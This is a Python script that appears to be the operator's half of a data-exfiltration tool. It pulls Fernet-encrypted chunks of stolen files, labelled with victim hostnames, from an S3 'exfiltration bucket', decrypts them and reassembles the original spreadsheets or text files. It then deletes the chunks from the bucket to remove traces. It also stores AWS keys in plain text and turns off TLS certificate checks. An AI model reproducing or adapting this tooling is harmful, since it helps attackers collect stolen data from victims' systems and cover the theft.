import boto3
import sys
import json
import os
import math
import argparse
from cryptography.fernet import Fernet
import urllib3

#---------- This will run the first time decrypter is opened --------------
try:
	with open('dectypterConfig.json') as json_file:
		data = json.load(json_file)
except FileNotFoundError:
	data = {
	'config': False,
	'key': b'',
	'aws_access_key_id': '',
	'aws_secret_access_key': '',
	'region': '',
	'exfiltration_bucket_name': ''
	}

if not data['config']:
	aws_access_key = input("Enter AWS access key: ")
	aws_secret_access_key = input("Enter AWS secret access key: ")
	region_name = input("Enter target bucket region: ")
	fernet_key = input("Enter encryption key: ")
	exfiltration_bucket_name = input("Enter the name of the bucket that contains the file to decrypt: ")

	data['key'] = fernet_key
	data['aws_access_key_id'] = aws_access_key
	data['aws_secret_access_key'] = aws_secret_access_key
	data['region'] = region_name
	data['exfiltration_bucket_name'] = exfiltration_bucket_name
	data['config'] = True

	with open('dectypterConfig.json', 'w') as outfile:
		json.dump(data, outfile)
#----------------------------------------------------------------------------
with open('dectypterConfig.json') as json_file:
    data = json.load(json_file)

key = data['key'].encode()
aws_access_key_id = data['aws_access_key_id']
aws_secret_access_key = data['aws_secret_access_key']
region = data['region']
exfiltration_bucket_name = data['exfiltration_bucket_name']

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()

parser.add_argument('-n', '--hostname', help = "Host of the file, check readme for example",
					required = True,
					action = 'store')
parser.add_argument('-i', '--input', help = "File to be decrypted",
					required = True,
					action = 'store')

args = parser.parse_args()

if not os.path.exists("decrypterOutput/"):
	os.makedirs("decrypterOutput/")

#----------Enviroment Reset (Delete old files, etc)--------------
if os.path.exists("reconstructedFile.txt"):
	os.remove("reconstructedFile.txt")

if not os.path.exists("downloadedFiles/"):
	os.makedirs("downloadedFiles/")

folder = 'downloadedFiles'
for file in os.listdir(folder):
	file_path = os.path.join(folder, file)
	if os.path.isfile(file_path):
		os.unlink(file_path)

#----------AWS Connection--------------
session = boto3.session.Session(aws_access_key_id = aws_access_key_id,
 								aws_secret_access_key = aws_secret_access_key,
 								region_name = region)
aws_s3_client = session.client('s3', verify = False)
aws_s3_resource = session.resource('s3', verify = False)

#----------Here we get the all the fileNames in our bucket--------------
list_response = aws_s3_client.list_objects(
	Bucket = exfiltration_bucket_name,
	Delimiter = '/exfiltrated_data'
)
try:
	list_response_contents = list_response['Contents']
except KeyError:
	print("The fileName + hostName combination was not found")
	print("Remember bucket contents are deleted once decrypted!")
	quit()
fileNames = []
for content in list_response_contents:
	name = content['Key'].replace('.txt','')
	#-----------We only get files which match our argv arguments----------
	if args.hostname in name and args.input in name:
		fileNames.append(name)

#----------We remove .txt for sorting, just in case--------------
fileNames.sort(key = lambda x: int(x.split('.')[-1]))
for i in range(len(fileNames)):
	fileNames[i] = fileNames[i] + '.txt'

print('--------------------------------------------------------------------------------')
print('Started decryption process...')
#----------S3 Download only transfers, so files must be created beforehand----------
for file in fileNames:
	name = file.replace('exfiltrated_data/','')
	print("Creating file "+ name + " for transfer")
	file = open('downloadedFiles/'+name , "w+")
	file.close()

#----------We download files from bucket to the previously created files--------------
for file in fileNames:
	print("Downloading " + file)
	name = file.replace('exfiltrated_data/','')
	aws_s3_resource.meta.client.download_file(exfiltration_bucket_name, file, 'downloadedFiles/'+name)

#----------We check the correct extension-------------
if "xlsx" in fileNames[0]:
	reconstructed_file_name = args.hostname + '-' + args.input +'.xlsx'
elif "csv" in fileNames[0]:
	reconstructed_file_name = args.hostname + '-' + args.input +'.csv'
else:
	reconstructed_file_name = args.hostname + '-' + args.input +'.txt'

#----------We create a reconstruction file--------------
with open('decrypterOutput/' + reconstructed_file_name, 'wb') as finalFile:
	#---------- fileNames are partitionNames--------
	for file in fileNames:

		#----------We open the n partition--------------
		name = file.replace('exfiltrated_data/','')
		print("Decrypting " + name)
		file = open('downloadedFiles/'+name , "r")
		data = file.read()
		data_bytes = data.encode()

		#----------Info decode--------------
		f = Fernet(key)
		data_decrypt = f.decrypt(data_bytes)

		#----------Info goes inside reconstructedFile--------------
		finalFile.write(data_decrypt)

		file.close()

#----------We delete all information from the bucket--------------
bucket = aws_s3_resource.Bucket(exfiltration_bucket_name)
for file in fileNames:
	aws_s3_resource.Object(exfiltration_bucket_name, file).delete()

print('Finished decryption! Check out reconstructed file')
print('--------------------------------------------------------------------------------')
